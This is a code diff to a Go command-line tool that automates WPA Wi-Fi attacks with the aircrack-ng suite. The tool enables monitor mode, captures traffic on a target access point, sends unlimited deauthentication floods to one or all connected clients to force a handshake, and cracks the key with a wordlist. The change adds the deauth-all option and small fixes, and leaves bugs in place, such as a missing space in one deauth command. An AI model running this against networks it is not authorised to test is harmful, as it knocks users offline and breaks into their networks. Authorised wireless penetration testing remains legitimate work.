@@ -699,7 +699,8 @@ func launchTerminal(cmdArgs...string) error {
 	return nil
 }
 
-func startMonitorMode(adapter string) error {
+func startMonitorMode(adapter string) string {
+	
 	// Kill processes that might interfere with the wireless interface
 	// cmdKill := exec.Command("airmon-ng", "check", "kill")
 	// cmdKill.Stdout = os.Stdout
@@ -718,37 +719,52 @@ func startMonitorMode(adapter string) error {
 	err := cmd.Run()
 	if err!= nil {
 		fmt.Println(Red + "Error " + Reset + "starting monitor mode:", err)
-		return err
+		return "operation failed"
 	}
 
 	fmt.Println("Monitor mode started " + Green + "successfully" + Reset + ".")
-	return nil
+	adapter = adapter+"mon"
+	return adapter
 }
 
-func captureTraffic() error {
+func captureTraffic(adapter string) error {
     fmt.Println("Opening new terminal window and capturing wireless traffic.")
     // Adjusted to include a continuous monitoring argument
-    return launchTerminal("airodump-ng", "wlan0mon")
+    return launchTerminal("airodump-ng", adapter)
 }
 
 
-func scanTarget(BSSID, channel string) error {
+func scanTarget(BSSID, channel, newadapter string) error {
 	fmt.Printf("Opening new terminal for target %s\n", Green + BSSID + Reset)
-	return launchTerminal("airodump-ng --bssid " + BSSID + " -c" + channel + " --write " + BSSID+"_WPAcrack wlan0mon")
+	return launchTerminal("airodump-ng --bssid " + BSSID + " -c" + channel + " --write captureWpa " + newadapter)
 }
 
-func deauthenticateTarget(BSSID , Station string) error {
+func deauthenticateAllTargets(BSSID, newadapter string) error {
+    fmt.Println("Turning target offline...")
+    return launchTerminal("aireplay-ng --deauth 0 -a " + BSSID + " " + newadapter)
+}
+
+func deauthenticateTarget(BSSID , Station, newadapter string) error {
 	fmt.Println("Turning target offline...")
-	return launchTerminal("aireplay-ng --deauth 100 -a "+BSSID+" wlan0mon")
+	return launchTerminal("aireplay-ng --deauth 0 -a "+BSSID+" -c " + Station + newadapter)
 }
 
-func crackWPA(key, wordlistfile string) error {
-	fmt.Printf("Cracking WPA KEY %s\n", key)
-	return launchTerminal("aircrack-ng -w "+wordlistfile+" WPAcrack")
+func crackWPA(wordlistfile string) error {
+	fmt.Printf("Cracking WPA KEY")
+	return launchTerminal("aircrack-ng -w "+wordlistfile+" captureWpa.cap")
 }
 
 func MonitorMode() {
 	// Enabling monitor mode
+	cmd := exec.Command("iwconfig")
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	err := cmd.Run()
+	if err!= nil {
+		fmt.Println(Red + "Error " + Reset + "showing wifi adapters", err)
+		return
+	}
+	fmt.Println()
 	fmt.Print("Specify Wireless adapter <<wlan0>>: ")
 	scanner := bufio.NewScanner(os.Stdin)
 	scanner.Scan()
@@ -758,21 +774,23 @@ func MonitorMode() {
 		adapter = "wlan0" // Default to wlan0 if no adapter is specified
 	}
 
+	//making sure adapter is wireless
 	if !strings.HasPrefix(adapter, "wlan") {
 		fmt.Println("Monitor mode is only applicable to wireless adapters. Please specify a wireless adapter.")
 		return
 	}
 
-	startMonitorMode(adapter)
+	newadapter := startMonitorMode(adapter)
+	fmt.Print(newadapter)
 	// Scanning Wireless Traffic
-	err := captureTraffic()
+	err = captureTraffic(newadapter)
 	if err != nil {
 		fmt.Println(Red + "Failed " + Reset + "to capture wireless traffic with error :", err)
 		return
 	}
-
+	
 	// Focusing on Target
-	var BSSID, channel, Station, key, wordlistfile string
+	var BSSID, channel, Station, wordlistfile string
 
 	fmt.Print("Target BSSID: ")
 	scanner.Scan()
@@ -782,7 +800,7 @@ func MonitorMode() {
 	scanner.Scan()
 	channel = scanner.Text()
 
-	err = scanTarget(BSSID, channel)
+	err = scanTarget(BSSID, channel, newadapter)
 	if err != nil {
 		fmt.Println(Red + "Failed " + Reset + "to scan target:", BSSID)
 		fmt.Println("Error : ", err)
@@ -790,21 +808,25 @@ func MonitorMode() {
 	}
 
 	// choosing client in target network to deauth
-	fmt.Print("Choose client on network to deauthenticate \n")
+	fmt.Print("Choose client on network to deauthenticate(press enter for all connected clients) \n")
 	fmt.Print("Station : ")
 	scanner.Scan()
 	Station = scanner.Text()
-
-	err = deauthenticateTarget(BSSID, Station)
-	if err != nil {
-		fmt.Println(Red + "Failed " + Reset + "to deauthenticate target:", BSSID)
+	if Station == "" {
+		err = deauthenticateAllTargets(BSSID, newadapter)
+		if err != nil {
+		fmt.Println(Red + "Failed " + Reset + "to deauthenticate clients on :", BSSID)
 		fmt.Println("Error : ", err)
 		return
+		}
+	} else { 
+		err = deauthenticateTarget(BSSID, Station, newadapter)
+		if err != nil {
+			fmt.Println(Red + "Failed " + Reset + "to deauthenticate target:", Station)
+			fmt.Println("Error : ", err)
+			return
+		} 
 	}
-
-	fmt.Print("Provide WPA key: ")
-	scanner.Scan()
-	key = scanner.Text()
 
 	fmt.Print("Wordlist file (leave empty for default): ")
 	scanner.Scan()
@@ -813,7 +835,7 @@ func MonitorMode() {
 		wordlistfile = "/pentest/passwords/wordlists/darkc0de"
 	}
 
-	err = crackWPA(key, wordlistfile)
+	err = crackWPA(wordlistfile)
 	if err != nil {
 		fmt.Println("Failed to crack WPA key:", err)
 		return
